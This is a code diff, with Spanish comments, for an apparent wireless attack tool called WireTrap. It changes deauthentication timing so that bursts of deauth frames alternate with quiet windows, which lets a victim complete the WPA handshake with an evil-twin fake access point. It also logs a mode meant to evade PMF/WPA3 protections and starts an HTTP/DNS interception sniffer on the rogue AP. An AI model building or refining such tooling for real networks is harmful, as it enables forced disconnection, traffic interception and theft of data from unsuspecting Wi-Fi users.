@@ -843,7 +843,7 @@ class WireTrap(QMainWindow):
                 f"Deauth enviados: {c} paquetes"
             )
         )
-        self.deauther.start(client_mac, self.selected_ap.bssid)
+        # El deauth se arranca después del Evil Twin para elegir el modo correcto
 
         # Iniciar evil twin (solo si la casilla está marcada)
         if self.chk_eviltwin.isChecked():
@@ -880,8 +880,17 @@ class WireTrap(QMainWindow):
                 wpa_passphrase=wpa_pass or "wiretrap123",
                 target_bssid=self.selected_ap.bssid
             )
-            
+
             if self.evil_twin.running:
+                # Modo ET: ráfaga de deauths → ventana de silencio → repite.
+                # El silencio da tiempo al cliente para completar el 4-way
+                # handshake con el Evil Twin sin ser expulsado de nuevo.
+                self.deauther.on_et_window = (
+                    lambda: self.bridge.log_message.emit(
+                        "[ET] Ventana libre — esperando asociación al AP falso..."
+                    )
+                )
+                self.deauther.start_et_mode(client_mac, self.selected_ap.bssid)
                 self.log(f"Usando MAC natural de la antena (Natural Roaming Mode "
                          f"para evadir protecciones PMF/WPA3)")
 
@@ -896,6 +905,8 @@ class WireTrap(QMainWindow):
                 self.sniffer.start()
                 self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")
             else:
+                # ET falló — deauth normal de todas formas
+                self.deauther.start(client_mac, self.selected_ap.bssid)
                 self.log("[!] Abortando inicio del sniffer porque falló AP falso.")
 
             self.et_table.setRowCount(0)
@@ -904,6 +915,8 @@ class WireTrap(QMainWindow):
                 "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
             )
         else:
+            # Deauth puro sin Evil Twin: bucle continuo normal
+            self.deauther.start(client_mac, self.selected_ap.bssid)
             self.log("Modo Deauth Puro (Evil Twin deshabilitado)")
         self.attacking = True
         self._update_attack_info()
